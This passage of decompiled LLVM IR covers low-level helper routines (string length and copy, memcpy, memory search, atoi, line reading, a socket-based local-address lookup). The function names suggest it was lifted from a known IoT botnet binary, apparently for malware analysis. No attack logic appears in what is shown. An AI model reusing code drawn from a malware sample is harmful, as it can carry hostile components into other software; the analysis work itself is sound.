  uselistorder i32 %v0_108bc, { 1, 0 }
  uselistorder i32 %v0_10898, { 1, 0 }
  uselistorder i32 %v0_10870, { 1, 0 }
  uselistorder i32 %v0_1084c, { 1, 0 }
  uselistorder i32 %v0_107c0, { 1, 0 }
  uselistorder i32 %v0_10778, { 1, 0 }
  uselistorder i32 %v0_1070c, { 1, 0 }
  uselistorder i32 %v0_106c8, { 1, 0 }
  uselistorder i32 %v0_106a8, { 1, 0 }
  uselistorder i32 %v0_1063c, { 1, 0 }
  uselistorder i32 %v0_1061c, { 1, 0 }
  uselistorder i32 %v0_105f8, { 1, 0 }
  uselistorder i32 %v0_105cc, { 1, 0 }
  uselistorder i32 23, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @util_memcpy, { 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_24f3c.217 to i32), { 4, 0, 1, 2, 3, 5 }
}

define i32 @util_strlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_10b58 = load i8, i8* %arg1, align 1
  %v2_10b5c = icmp eq i8 %v3_10b58, 0
  %v0_10b60 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10b5c, i32 %v0_10b60)
  br label %dec_label_pc_10b68

dec_label_pc_10b68:                               ; preds = %dec_label_pc_10b68, %entry
  %v0_10b68 = phi i32 [ %v1_10b68, %dec_label_pc_10b68 ], [ 0, %entry ]
  %v1_10b68 = add i32 %v0_10b68, 1
  %v2_10b6c = add i32 %v1_10b68, %tmp
  %v3_10b6c = inttoptr i32 %v2_10b6c to i8*
  %v4_10b6c = load i8, i8* %v3_10b6c, align 1
  %v6_10b6c = zext i8 %v4_10b6c to i32
  store i32 %v6_10b6c, i32* @r3, align 4
  %v2_10b70 = icmp eq i8 %v4_10b6c, 0
  br i1 %v2_10b70, label %dec_label_pc_10b78, label %dec_label_pc_10b68

dec_label_pc_10b78:                               ; preds = %dec_label_pc_10b68
  ret i32 %v1_10b68
}

define i32 @util_strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v2_10b7c = load i8, i8* %arg1, align 1
  %v3_10b7c = zext i8 %v2_10b7c to i32
  store i32 %v3_10b7c, i32* @r2, align 4
  %v2_10b80 = icmp eq i8 %v2_10b7c, 0
  br i1 %v2_10b80, label %bb, label %dec_label_pc_10b8c

bb:                                               ; preds = %entry
  store i32 %v3_10b7c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10ba0

dec_label_pc_10b8c:                               ; preds = %entry
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10b90

dec_label_pc_10b90:                               ; preds = %dec_label_pc_10b90, %dec_label_pc_10b8c
  %v0_10b90 = phi i32 [ %v1_10b90, %dec_label_pc_10b90 ], [ 0, %dec_label_pc_10b8c ]
  %v1_10b90 = add i32 %v0_10b90, 1
  store i32 %v1_10b90, i32* %ip.global-to-local, align 4
  %v2_10b94 = add i32 %v1_10b90, %tmp
  %v3_10b94 = inttoptr i32 %v2_10b94 to i8*
  %v4_10b94 = load i8, i8* %v3_10b94, align 1
  %v2_10b98 = icmp eq i8 %v4_10b94, 0
  br i1 %v2_10b98, label %dec_label_pc_10ba0, label %dec_label_pc_10b90

dec_label_pc_10ba0:                               ; preds = %dec_label_pc_10b90, %bb
  %v0_10ba0 = phi i32 [ %v3_10b7c, %bb ], [ %v1_10b90, %dec_label_pc_10b90 ]
  br label %dec_label_pc_10bac

dec_label_pc_10ba8:                               ; preds = %dec_label_pc_10bac
  %v0_10ba8 = load i32, i32* @r1, align 4
  %v1_10ba8 = add i32 %v0_10ba8, 1
  %v2_10ba8 = inttoptr i32 %v1_10ba8 to i8*
  %v3_10ba8 = load i8, i8* %v2_10ba8, align 1
  %v4_10ba8 = zext i8 %v3_10ba8 to i32
  store i32 %v4_10ba8, i32* @r2, align 4
  store i32 %v1_10ba8, i32* @r1, align 4
  %v0_10bac.pr = load i32, i32* @r3, align 4
  br label %dec_label_pc_10bac

dec_label_pc_10bac:                               ; preds = %dec_label_pc_10ba0, %dec_label_pc_10ba8
  %v0_10bb4.off0 = phi i8 [ %v2_10b7c, %dec_label_pc_10ba0 ], [ %v3_10ba8, %dec_label_pc_10ba8 ]
  %v0_10bac = phi i32 [ %v0_10ba0, %dec_label_pc_10ba0 ], [ %v0_10bac.pr, %dec_label_pc_10ba8 ]
  %v1_10bac = add i32 %v0_10bac, -1
  store i32 %v1_10bac, i32* @r3, align 4
  %v3_10bb0 = icmp eq i32 %v0_10bac, 0
  %v2_10bb4 = load i32, i32* @r0, align 4
  %v3_10bb4 = inttoptr i32 %v2_10bb4 to i8*
  store i8 %v0_10bb4.off0, i8* %v3_10bb4, align 1
  %v4_10bb4 = load i32, i32* @r0, align 4
  %v5_10bb4 = add i32 %v4_10bb4, 1
  store i32 %v5_10bb4, i32* @r0, align 4
  br i1 %v3_10bb0, label %dec_label_pc_10bbc, label %dec_label_pc_10ba8

dec_label_pc_10bbc:                               ; preds = %dec_label_pc_10bac
  %v0_10bbc = load i32, i32* %ip.global-to-local, align 4
  ret i32 %v0_10bbc

; uselistorder directives
  uselistorder i32 %v0_10bac, { 1, 0 }
  uselistorder i32 %v1_10b90, { 0, 1, 3, 2 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10bac, { 1, 0 }
}

define i32 @util_memcpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %v2_10bc4 = icmp eq i32 %arg3, 0
  %v0_10bc8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10bc4, i32 %v0_10bc8)
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10bd0

dec_label_pc_10bd0:                               ; preds = %dec_label_pc_10bd0, %entry
  %v0_10bd0 = phi i32 [ %v1_10bd8, %dec_label_pc_10bd0 ], [ 0, %entry ]
  %v2_10bd0 = add i32 %v0_10bd0, %arg2
  %v3_10bd0 = inttoptr i32 %v2_10bd0 to i8*
  %v4_10bd0 = load i8, i8* %v3_10bd0, align 1
  %v4_10bd4 = add i32 %v0_10bd0, %arg1
  %v5_10bd4 = inttoptr i32 %v4_10bd4 to i8*
  store i8 %v4_10bd0, i8* %v5_10bd4, align 1
  %v0_10bd8 = load i32, i32* %ip.global-to-local, align 4
  %v1_10bd8 = add i32 %v0_10bd8, 1
  store i32 %v1_10bd8, i32* %ip.global-to-local, align 4
  %v9_10bdc = icmp eq i32 %v1_10bd8, %arg3
  br i1 %v9_10bdc, label %dec_label_pc_10be4, label %dec_label_pc_10bd0

dec_label_pc_10be4:                               ; preds = %dec_label_pc_10bd0
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_10bd8, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @util_zero() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %v0_10be8 = load i32, i32* @r1, align 4
  %v2_10be8 = icmp eq i32 %v0_10be8, 0
  %v0_10bec = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10be8, i32 %v0_10bec)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10bf4

dec_label_pc_10bf4:                               ; preds = %dec_label_pc_10bf4, %entry
  %v2_10bf8 = phi i32 [ %v1_10bfc, %dec_label_pc_10bf4 ], [ 0, %entry ]
  store i32 0, i32* @r3, align 4
  %v3_10bf8 = load i32, i32* @r0, align 4
  %v4_10bf8 = add i32 %v3_10bf8, %v2_10bf8
  %v5_10bf8 = inttoptr i32 %v4_10bf8 to i8*
  store i8 0, i8* %v5_10bf8, align 1
  %v0_10bfc = load i32, i32* %r2.global-to-local, align 4
  %v1_10bfc = add i32 %v0_10bfc, 1
  store i32 %v1_10bfc, i32* %r2.global-to-local, align 4
  %v1_10c00 = load i32, i32* @r1, align 4
  %v9_10c00 = icmp eq i32 %v1_10bfc, %v1_10c00
  br i1 %v9_10c00, label %dec_label_pc_10c08, label %dec_label_pc_10bf4

dec_label_pc_10c08:                               ; preds = %dec_label_pc_10bf4
  %v1_10c08 = load i32, i32* @r0, align 4
  ret i32 %v1_10c08

; uselistorder directives
  uselistorder i32 %v1_10bfc, { 1, 2, 0 }
}

define i32 @util_memsearch(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v7_10c20 = icmp sgt i32 %arg4, %arg2
  br i1 %v7_10c20, label %dec_label_pc_10c28, label %dec_label_pc_10c30

dec_label_pc_10c28:                               ; preds = %dec_label_pc_10c44, %dec_label_pc_10c30, %entry, %dec_label_pc_10c70
  %storemerge = phi i32 [ %v1_10c70, %dec_label_pc_10c70 ], [ -1, %entry ], [ -1, %dec_label_pc_10c30 ], [ -1, %dec_label_pc_10c44 ]
  ret i32 %storemerge

dec_label_pc_10c30:                               ; preds = %entry
  %tmp12 = icmp slt i32 %arg2, 1
  br i1 %tmp12, label %dec_label_pc_10c28, label %dec_label_pc_10c38

dec_label_pc_10c38:                               ; preds = %dec_label_pc_10c30
  br label %dec_label_pc_10c50

dec_label_pc_10c44:                               ; preds = %bb, %dec_label_pc_10c64
  %v1_10c503 = phi i32 [ %v1_10c64, %dec_label_pc_10c64 ], [ 0, %bb ]
  %v1_10c44 = add i32 %v0_10c70, 1
  %v9_10c48 = icmp eq i32 %v1_10c44, %arg2
  br i1 %v9_10c48, label %dec_label_pc_10c28, label %dec_label_pc_10c50

dec_label_pc_10c50:                               ; preds = %dec_label_pc_10c44, %dec_label_pc_10c38
  %v0_10c70 = phi i32 [ %v1_10c44, %dec_label_pc_10c44 ], [ 0, %dec_label_pc_10c38 ]
  %v1_10c50 = phi i32 [ %v1_10c503, %dec_label_pc_10c44 ], [ 0, %dec_label_pc_10c38 ]
  %v2_10c50 = add i32 %v1_10c50, %arg3
  %v3_10c50 = inttoptr i32 %v2_10c50 to i8*
  %v4_10c50 = load i8, i8* %v3_10c50, align 1
  %v2_10c54 = add i32 %v0_10c70, %arg1
  %v3_10c54 = inttoptr i32 %v2_10c54 to i8*
  %v4_10c54 = load i8, i8* %v3_10c54, align 1
  %v9_10c58 = icmp eq i8 %v4_10c54, %v4_10c50
  br i1 %v9_10c58, label %dec_label_pc_10c64, label %bb

bb:                                               ; preds = %dec_label_pc_10c50
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_10c44

dec_label_pc_10c64:                               ; preds = %dec_label_pc_10c50
  %v1_10c64 = add i32 %v1_10c50, 1
  store i32 %v1_10c64, i32* @ip, align 4
  %v9_10c68 = icmp eq i32 %v1_10c64, %arg4
  br i1 %v9_10c68, label %dec_label_pc_10c70, label %dec_label_pc_10c44

dec_label_pc_10c70:                               ; preds = %dec_label_pc_10c64
  %v1_10c70 = add i32 %v0_10c70, 1
  br label %dec_label_pc_10c28

; uselistorder directives
  uselistorder i32 %v1_10c64, { 1, 2, 0 }
  uselistorder i32 %v1_10c50, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10c44, { 1, 0 }
  uselistorder label %dec_label_pc_10c28, { 3, 0, 1, 2 }
}

define i32 @util_atoi(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_10c88

dec_label_pc_10c88:                               ; preds = %.thread, %dec_label_pc_10c9c, %bb, %entry
  %v0_10c88 = phi i32 [ %tmp, %entry ], [ %v5_10c88, %bb ], [ %v5_10c88, %dec_label_pc_10c9c ], [ %v5_10c88, %.thread ]
  %v1_10c88 = inttoptr i32 %v0_10c88 to i8*
  %v2_10c88 = load i8, i8* %v1_10c88, align 1
  %v5_10c88 = add i32 %v0_10c88, 1
  %v7_10c8c = icmp eq i8 %v2_10c88, 9
  br i1 %v7_10c8c, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_10c88
  br label %dec_label_pc_10c88

bb:                                               ; preds = %dec_label_pc_10c88
  %v8_10c90 = icmp eq i8 %v2_10c88, 32
  br i1 %v8_10c90, label %dec_label_pc_10c88, label %dec_label_pc_10c9c

dec_label_pc_10c9c:                               ; preds = %bb
  %v7_10c9c = icmp eq i8 %v2_10c88, 10
  br i1 %v7_10c9c, label %dec_label_pc_10c88, label %dec_label_pc_10ca4

dec_label_pc_10ca4:                               ; preds = %dec_label_pc_10c9c
  %v7_10ca4 = icmp eq i8 %v2_10c88, 45
  br i1 %v7_10ca4, label %dec_label_pc_10d94, label %dec_label_pc_10cac

dec_label_pc_10cac:                               ; preds = %dec_label_pc_10ca4
  %v7_10cac = icmp eq i8 %v2_10c88, 43
  br i1 %v7_10cac, label %bb54, label %dec_label_pc_10cbc

bb54:                                             ; preds = %dec_label_pc_10cac
  %v2_10cb0 = inttoptr i32 %v5_10c88 to i8*
  %v3_10cb0 = load i8, i8* %v2_10cb0, align 1
  %v6_10cb0 = add i32 %v0_10c88, 2
  br label %dec_label_pc_10cbc

dec_label_pc_10cbc:                               ; preds = %bb54, %dec_label_pc_10cac, %dec_label_pc_10d94
  %v1_10d6439 = phi i32 [ %v5_10d94, %dec_label_pc_10d94 ], [ %v5_10c88, %dec_label_pc_10cac ], [ %v6_10cb0, %bb54 ]
  %v0_10ce410.in = phi i8 [ %v2_10d94, %dec_label_pc_10d94 ], [ %v2_10c88, %dec_label_pc_10cac ], [ %v3_10cb0, %bb54 ]
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_10d94 ], [ 2147483647, %dec_label_pc_10cac ], [ 2147483647, %bb54 ]
  %v0_10da4 = phi i32 [ 1, %dec_label_pc_10d94 ], [ 0, %dec_label_pc_10cac ], [ 0, %bb54 ]
  %v2_10cc4 = udiv i32 %storemerge1, %arg2
  %v3_10cc4 = urem i32 %storemerge1, %arg2
  br label %dec_label_pc_10ce4.outer

dec_label_pc_10ce4.outer:                         ; preds = %.thread5, %dec_label_pc_10cbc
  %v1_10d64.ph = phi i32 [ %v6_10d64, %.thread5 ], [ %v1_10d6439, %dec_label_pc_10cbc ]
  %v2_10d60.ph = phi i32 [ %v5_10d60, %.thread5 ], [ 0, %dec_label_pc_10cbc ]
  %v1_10d24.ph.in = phi i8 [ %v3_10d64, %.thread5 ], [ %v0_10ce410.in, %dec_label_pc_10cbc ]
  %v1_10d3c.ph = phi i32 [ 1, %.thread5 ], [ 0, %dec_label_pc_10cbc ]
  %v3_10d30 = icmp uge i32 %v2_10d60.ph, %v2_10cc4
  %v9_10d30 = icmp eq i32 %v2_10d60.ph, %v2_10cc4
  %v2_10d34 = xor i1 %v3_10d30, true
  %v3_10d34 = or i1 %v9_10d30, %v2_10d34
  %v2_10d38 = xor i1 %v9_10d30, true
  %v3_10d38 = and i1 %v3_10d30, %v2_10d38
  %v2_10d58 = icmp eq i1 %v9_10d30, false
  br label %dec_label_pc_10ce4

dec_label_pc_10ce4:                               ; preds = %dec_label_pc_10ce4.outer, %dec_label_pc_10d6c
  %v1_10d64 = phi i32 [ %v5_10d6c, %dec_label_pc_10d6c ], [ %v1_10d64.ph, %dec_label_pc_10ce4.outer ]
  %v1_10d3c = phi i32 [ -1, %dec_label_pc_10d6c ], [ %v1_10d3c.ph, %dec_label_pc_10ce4.outer ]
  %v1_10d24.in = phi i8 [ %v2_10d6c, %dec_label_pc_10d6c ], [ %v1_10d24.ph.in, %dec_label_pc_10ce4.outer ]
  %v1_10d24 = zext i8 %v1_10d24.in to i32
  %v1_10ce4 = urem i32 %v1_10d24, 256
  %v1_10ce8 = add nsw i32 %v1_10ce4, -48
  %v1_10cf0 = add nsw i32 %v1_10ce4, -97
  %v1_10cf4 = add nsw i32 %v1_10d24, -48
  %v1_10cf8 = add nsw i32 %v1_10ce4, -65
  %tmp87 = icmp ult i32 %v1_10ce8, 10
  br i1 %tmp87, label %dec_label_pc_10d28, label %dec_label_pc_10d00

dec_label_pc_10d00:                               ; preds = %dec_label_pc_10ce4
  %v2_10d00 = icmp ugt i32 %v1_10cf8, 24
  %v7_10d00 = icmp eq i32 %v1_10cf8, 25
  %v2_10d04 = xor i1 %v7_10d00, true
  %v3_10d04 = and i1 %v2_10d00, %v2_10d04
  br i1 %v3_10d04, label %bb55, label %bb56

bb55:                                             ; preds = %dec_label_pc_10d00
  br label %bb56

bb56:                                             ; preds = %dec_label_pc_10d00, %bb55
  %v0_10d1815 = phi i32 [ %v1_10cf4, %dec_label_pc_10d00 ], [ 0, %bb55 ]
  %v2_10d08 = xor i1 %v2_10d00, true
  %v3_10d08 = or i1 %v7_10d00, %v2_10d08
  br i1 %v3_10d08, label %bb57, label %bb58

bb57:                                             ; preds = %bb56
  br label %bb58

bb58:                                             ; preds = %bb56, %bb57
  %v0_10d18 = phi i32 [ %v0_10d1815, %bb56 ], [ 1, %bb57 ]
  br i1 %v3_10d04, label %bb59, label %bb60

bb59:                                             ; preds = %bb58
  %v6_10d10 = icmp ugt i32 %v1_10cf0, 24
  %v11_10d10 = icmp eq i32 %v1_10cf0, 25
  br label %bb60

bb60:                                             ; preds = %bb58, %bb59
  %v1_10d14 = phi i1 [ %v7_10d00, %bb58 ], [ %v11_10d10, %bb59 ]
  %v0_10d14 = phi i1 [ %v2_10d00, %bb58 ], [ %v6_10d10, %bb59 ]
  %v2_10d14 = xor i1 %v1_10d14, true
  %v3_10d14 = and i1 %v0_10d14, %v2_10d14
  br i1 %v3_10d14, label %dec_label_pc_10d78, label %dec_label_pc_10d18

dec_label_pc_10d18:                               ; preds = %bb60
  %v2_10d18 = icmp eq i32 %v0_10d18, 0
  %. = select i1 %v2_10d18, i32 87, i32 55
  %v2_10d24 = sub nsw i32 %v1_10d24, %.
  br label %dec_label_pc_10d28

dec_label_pc_10d28:                               ; preds = %dec_label_pc_10ce4, %dec_label_pc_10d18
  %v0_10d3c33 = phi i32 [ %v1_10cf8, %dec_label_pc_10ce4 ], [ %., %dec_label_pc_10d18 ]
  %v3_10d60 = phi i32 [ %v1_10cf4, %dec_label_pc_10ce4 ], [ %v2_10d24, %dec_label_pc_10d18 ]
  %v2_10d28 = sub i32 %v3_10d60, %arg2
  %v4_10d28 = xor i32 %v3_10d60, %arg2
  %v5_10d28 = xor i32 %v2_10d28, %v3_10d60
  %v6_10d28 = and i32 %v5_10d28, %v4_10d28
  %v7_10d28 = icmp slt i32 %v6_10d28, 0
  %v8_10d28 = icmp slt i32 %v2_10d28, 0
  %v2_10d2c = xor i1 %v8_10d28, %v7_10d28
  br i1 %v2_10d2c, label %dec_label_pc_10d30, label %dec_label_pc_10d78

dec_label_pc_10d30:                               ; preds = %dec_label_pc_10d28
  br i1 %v3_10d34, label %bb63, label %bb64

bb63:                                             ; preds = %dec_label_pc_10d30
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_10d30, %bb63
  %v0_10d3c32 = phi i32 [ %v0_10d3c33, %dec_label_pc_10d30 ], [ 0, %bb63 ]
  br i1 %v3_10d38, label %bb65, label %bb66

bb65:                                             ; preds = %bb64
  br label %bb66

bb66:                                             ; preds = %bb64, %bb65
  %v0_10d3c = phi i32 [ %v0_10d3c32, %bb64 ], [ 1, %bb65 ]
  %tmp88 = icmp slt i32 %v1_10d3c, 0
  %v4_10d3c = zext i1 %tmp88 to i32
  %v5_10d3c = or i32 %v0_10d3c, %v4_10d3c
  %v7_10d3c = icmp eq i32 %v5_10d3c, 0
  br i1 %v7_10d3c, label %dec_label_pc_10d44, label %dec_label_pc_10d6c

dec_label_pc_10d44:                               ; preds = %bb66
  %v2_10d50 = sub i32 %v3_10d60, %v3_10cc4
  %v4_10d50 = xor i32 %v3_10d60, %v3_10cc4
  %v5_10d50 = xor i32 %v2_10d50, %v3_10d60
  %v6_10d50 = and i32 %v5_10d50, %v4_10d50
  %v7_10d50 = icmp slt i32 %v6_10d50, 0
  %v8_10d50 = icmp slt i32 %v2_10d50, 0
  %v9_10d50 = icmp eq i32 %v3_10d60, %v3_10cc4
  %v3_10d54 = xor i1 %v8_10d50, %v7_10d50
  %v4_10d54 = or i1 %v9_10d50, %v3_10d54
  br i1 %v4_10d54, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_10d44
  br label %.thread5

thread-pre-split:                                 ; preds = %dec_label_pc_10d44
  br i1 %v2_10d58, label %.thread5, label %dec_label_pc_10d6c

.thread5:                                         ; preds = %thread-pre-split, %thread-pre-split.thread
  %v4_10d60 = mul i32 %v2_10d60.ph, %arg2
  %v5_10d60 = add i32 %v3_10d60, %v4_10d60
  %v2_10d64 = inttoptr i32 %v1_10d64 to i8*
  %v3_10d64 = load i8, i8* %v2_10d64, align 1
  %v6_10d64 = add i32 %v1_10d64, 1
  br label %dec_label_pc_10ce4.outer

dec_label_pc_10d6c:                               ; preds = %thread-pre-split, %bb66
  %v1_10d6c = inttoptr i32 %v1_10d64 to i8*
  %v2_10d6c = load i8, i8* %v1_10d6c, align 1
  %v5_10d6c = add i32 %v1_10d64, 1
  br label %dec_label_pc_10ce4

dec_label_pc_10d78:                               ; preds = %dec_label_pc_10d28, %bb60
  %v1_10d78 = icmp slt i32 %v1_10d3c, 0
  %v2_10da4 = icmp eq i32 %v0_10da4, 0
  br i1 %v1_10d78, label %dec_label_pc_10da4, label %dec_label_pc_10d80

dec_label_pc_10d80:                               ; preds = %dec_label_pc_10d78
  br i1 %v2_10da4, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_10d80
  %v2_10d84 = sub i32 0, %v2_10d60.ph
  br label %bb70

bb70:                                             ; preds = %.thread43, %bb71, %dec_label_pc_10d80, %bb69
  %v1_10d90 = phi i32 [ -2147483648, %bb71 ], [ %v2_10d60.ph, %dec_label_pc_10d80 ], [ %v2_10d84, %bb69 ], [ 2147483647, %.thread43 ]
  ret i32 %v1_10d90

dec_label_pc_10d94:                               ; preds = %dec_label_pc_10ca4
  %v1_10d94 = inttoptr i32 %v5_10c88 to i8*
  %v2_10d94 = load i8, i8* %v1_10d94, align 1
  %v5_10d94 = add i32 %v0_10c88, 2
  br label %dec_label_pc_10cbc

dec_label_pc_10da4:                               ; preds = %dec_label_pc_10d78
  br i1 %v2_10da4, label %.thread43, label %bb71

.thread43:                                        ; preds = %dec_label_pc_10da4
  br label %bb70

bb71:                                             ; preds = %dec_label_pc_10da4
  br label %bb70

; uselistorder directives
  uselistorder i1 %v2_10da4, { 1, 0 }
  uselistorder i32 %v2_10d50, { 1, 0 }
  uselistorder i32 %v2_10d28, { 1, 0 }
  uselistorder i32 %v3_10d60, { 0, 6, 1, 2, 5, 3, 4, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_10d00, { 1, 2, 0 }
  uselistorder i1 %v2_10d00, { 1, 0, 2 }
  uselistorder i32 %v1_10ce4, { 1, 2, 0 }
  uselistorder i32 %v1_10d24, { 1, 0, 2 }
  uselistorder i32 %v1_10d3c, { 1, 0 }
  uselistorder i32 %v1_10d64, { 2, 3, 1, 0 }
  uselistorder i1 %v9_10d30, { 1, 0, 2 }
  uselistorder i1 %v3_10d30, { 1, 0 }
  uselistorder i32 %v2_10d60.ph, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v3_10cc4, { 1, 0, 2 }
  uselistorder i32 %v2_10cc4, { 1, 0 }
  uselistorder i32 %v5_10c88, { 4, 3, 5, 2, 1, 0 }
  uselistorder i32 %v0_10c88, { 0, 1, 3, 2 }
  uselistorder i32 25, { 14, 15, 8, 2, 3, 0, 9, 4, 10, 1, 11, 5, 6, 12, 7, 13 }
  uselistorder i8 32, { 8, 9, 10, 11, 12, 13, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i8 9, { 2, 0, 1 }
  uselistorder label %bb70, { 1, 0, 3, 2 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
  uselistorder label %dec_label_pc_10d28, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %dec_label_pc_10ce4, { 1, 0 }
  uselistorder label %dec_label_pc_10cbc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10c88, { 1, 2, 0, 3 }
}

define i32 @util_fdgets(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_10db4 = load i32, i32* @r4, align 4
  store i32 %v3_10db4, i32* %stack_var_-24, align 4
  %v6_10db4 = load i32, i32* @r5, align 4
  %v9_10db4 = load i32, i32* @r6, align 4
  %v12_10db4 = load i32, i32* @r7, align 4
  %v15_10db4 = load i32, i32* @r8, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_10dcc

dec_label_pc_10dcc:                               ; preds = %dec_label_pc_10df0.dec_label_pc_10dcc_crit_edge, %entry
  %v0_10dd0 = phi i32 [ %v0_10dd0.pre, %dec_label_pc_10df0.dec_label_pc_10dcc_crit_edge ], [ %arg3, %entry ]
  %v0_10dcc = phi i32 [ %v5_10df0, %dec_label_pc_10df0.dec_label_pc_10dcc_crit_edge ], [ %tmp, %entry ]
  store i32 %v0_10dcc, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_10dd8 = call i32 @__libc_read(i32 %v0_10dd0)
  %v7_10ddc = icmp eq i32 %v1_10dd8, 1
  %v0_10de4 = load i32, i32* @r5, align 4
  br i1 %v7_10ddc, label %dec_label_pc_10de4, label %dec_label_pc_10dfc

dec_label_pc_10de4:                               ; preds = %dec_label_pc_10dcc
  %v1_10de4 = add i32 %v0_10de4, 1
  store i32 %v1_10de4, i32* @r5, align 4
  %v1_10de8 = load i32, i32* @r8, align 4
  %v6_10dec = icmp slt i32 %v1_10de4, %v1_10de8
  br i1 %v6_10dec, label %dec_label_pc_10df0, label %.loopexit

dec_label_pc_10df0:                               ; preds = %dec_label_pc_10de4
  %v0_10df0 = load i32, i32* @r4, align 4
  %v1_10df0 = inttoptr i32 %v0_10df0 to i8*
  %v2_10df0 = load i8, i8* %v1_10df0, align 1
  %v3_10df0 = zext i8 %v2_10df0 to i32
  store i32 %v3_10df0, i32* @r3, align 4
  %v5_10df0 = add i32 %v0_10df0, 1
  store i32 %v5_10df0, i32* @r4, align 4
  %v7_10df4 = icmp eq i8 %v2_10df0, 10
  br i1 %v7_10df4, label %dec_label_pc_10dfc, label %dec_label_pc_10df0.dec_label_pc_10dcc_crit_edge

dec_label_pc_10df0.dec_label_pc_10dcc_crit_edge:  ; preds = %dec_label_pc_10df0
  %v0_10dd0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_10dcc

dec_label_pc_10dfc:                               ; preds = %dec_label_pc_10dcc, %dec_label_pc_10df0
  %v0_10dfc = phi i32 [ %v1_10de4, %dec_label_pc_10df0 ], [ %v0_10de4, %dec_label_pc_10dcc ]
  %v2_10dfc = icmp eq i32 %v0_10dfc, 0
  br i1 %v2_10dfc, label %bb, label %.loopexit

bb:                                               ; preds = %dec_label_pc_10dfc
  store i32 0, i32* @r7, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_10de4, %dec_label_pc_10dfc, %bb
  %v0_10e04 = load i32, i32* @r7, align 4
  %v2_10e08 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10e08, i32* @r4, align 4
  store i32 %v6_10db4, i32* @r5, align 4
  store i32 %v9_10db4, i32* @r6, align 4
  store i32 %v12_10db4, i32* @r7, align 4
  store i32 %v15_10db4, i32* @r8, align 4
  ret i32 %v0_10e04

; uselistorder directives
  uselistorder i32 %v5_10df0, { 1, 0 }
  uselistorder label %.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10dfc, { 1, 0 }
}

define i32 @util_local_addr() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10e10 = load i32, i32* @r4, align 4
  %v6_10e10 = load i32, i32* @r5, align 4
  %v9_10e10 = load i32, i32* @r6, align 4
  store i32 16, i32* @r6, align 4
  store i32 16, i32* %stack_var_-20, align 4
  %v0_10e20 = call i32 @__GI___errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_10e28 = inttoptr i32 %v0_10e20 to i32*
  store i32 0, i32* %v2_10e28, align 4
  %v0_10e34 = load i32, i32* %r4.global-to-local, align 4
  %v3_10e38 = call i32 @socket(i32 2, i32 2, i32 %v0_10e34)
  %v7_10e3c = icmp eq i32 %v3_10e38, -1
  store i32 %v3_10e38, i32* @r5, align 4
  br i1 %v7_10e3c, label %bb, label %dec_label_pc_10e4c

bb:                                               ; preds = %entry
  %v1_10e44 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10e98

dec_label_pc_10e4c:                               ; preds = %entry
  %v2_10e58 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_10e58, i32* @r4, align 4
  %v0_10e64 = load i32, i32* @r6, align 4
  store i32 2, i32* %stack_var_-36, align 4
